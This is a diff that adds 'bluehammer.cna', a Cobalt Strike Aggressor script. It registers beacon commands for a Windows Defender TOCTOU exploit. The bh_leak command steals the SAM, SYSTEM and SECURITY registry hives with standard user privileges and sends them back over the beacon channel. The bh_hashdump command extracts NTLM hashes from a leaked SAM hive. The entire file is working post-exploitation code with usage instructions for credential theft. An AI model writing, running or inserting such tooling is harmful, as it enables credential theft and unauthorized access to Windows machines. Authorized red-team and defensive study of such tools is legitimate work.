@@ -1,0 +1,116 @@
+#
+# bluehammer.cna - BlueHammer BOF Aggressor Script
+#
+# Registers beacon commands for the BlueHammer Defender TOCTOU exploit.
+# Two BOFs:
+#   bh_leak     - Leak protected files (SAM/SYSTEM/SECURITY) via Defender race condition
+#   bh_hashdump - Extract NTLM hashes from a leaked SAM hive
+#
+
+# ============================================================================
+# Helper: load and execute a BOF
+# ============================================================================
+
+sub bluehammer_exec {
+    local('$bid $bof_name $args $barch $handle $data $packed');
+    $bid = $1;
+    $bof_name = $2;
+    $args = $3;
+
+    $barch = barch($bid);
+
+    # Only x64 supported (exploit uses x64-specific structures)
+    if ($barch ne "x64") {
+        berror($bid, "BlueHammer only supports x64 beacons");
+        return;
+    }
+
+    $handle = openf(script_resource("bin/" . $bof_name . ".x64.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Failed to load BOF: bin/" . $bof_name . ".x64.o");
+        return;
+    }
+
+    $packed = bof_pack($bid, "z", $args);
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+# ============================================================================
+# bh_leak - Leak protected files via Defender TOCTOU exploit
+# ============================================================================
+
+beacon_command_register(
+    "bh_leak",
+    "Leak protected files (SAM/SYSTEM/SECURITY) via Windows Defender TOCTOU race condition",
+    "Usage: bh_leak [/dump:sam|system|security|all] [/verbose]\n\n" .
+    "Exploits race conditions in Windows Defender's signature update mechanism\n" .
+    "to read locked registry hives through VSS + junction + symlink redirection.\n\n" .
+    "Options:\n" .
+    "  /dump:all        Leak SAM, SYSTEM, and SECURITY hives (default)\n" .
+    "  /dump:sam        Leak only SAM\n" .
+    "  /dump:system     Leak only SYSTEM\n" .
+    "  /dump:security   Leak only SECURITY\n" .
+    "  /verbose         Enable verbose output\n\n" .
+    "Requirements:\n" .
+    "  - Windows Defender must be running\n" .
+    "  - Internet access (downloads from Microsoft CDN)\n" .
+    "  - Standard user privileges (no admin required)\n\n" .
+    "Leaked files are sent back via the beacon download channel.\n" .
+    "Use secretsdump.py offline to extract hashes from SAM+SYSTEM.\n\n" .
+    "Example:\n" .
+    "  bh_leak /dump:all\n" .
+    "  bh_leak /dump:sam"
+);
+
+alias bh_leak {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 8);  # Everything after "bh_leak "
+
+    if (strlen($args) == 0) {
+        $args = "/dump:all";
+    }
+
+    btask($bid, "Executing BlueHammer file leak exploit...");
+    bluehammer_exec($bid, "bh_leak", $args);
+}
+
+# ============================================================================
+# bh_hashdump - Extract NTLM hashes from leaked SAM hive
+# ============================================================================
+
+beacon_command_register(
+    "bh_hashdump",
+    "Extract NTLM hashes from a leaked SAM hive file",
+    "Usage: bh_hashdump /sam:C:\\path\\to\\SAM.bin [/offreg:C:\\path\\to\\offreg.dll]\n\n" .
+    "Reads the LSA boot key from the live SYSTEM registry and decrypts\n" .
+    "NTLM hashes from an offline SAM hive (e.g., leaked via bh_leak).\n\n" .
+    "Options:\n" .
+    "  /sam:PATH        Path to the leaked SAM hive file (required)\n" .
+    "  /offreg:PATH     Path to offreg.dll if not on PATH (optional)\n\n" .
+    "Requirements:\n" .
+    "  - Leaked SAM file on the target\n" .
+    "  - offreg.dll (Microsoft Offline Registry Library) on the target\n" .
+    "  - SYSTEM/admin access for boot key extraction\n\n" .
+    "Note: For offline extraction, use secretsdump.py with SAM+SYSTEM files.\n\n" .
+    "Example:\n" .
+    "  bh_hashdump /sam:C:\\Users\\Public\\SAM.bin\n" .
+    "  bh_hashdump /sam:C:\\temp\\SAM.bin /offreg:C:\\temp\\offreg.dll"
+);
+
+alias bh_hashdump {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 12);  # Everything after "bh_hashdump "
+
+    if (strlen($args) == 0) {
+        berror($bid, "Usage: bh_hashdump /sam:C:\\path\\to\\SAM.bin [/offreg:C:\\path\\to\\offreg.dll]");
+        return;
+    }
+
+    btask($bid, "Extracting NTLM hashes from SAM hive...");
+    bluehammer_exec($bid, "bh_hashdump", $args);
+}
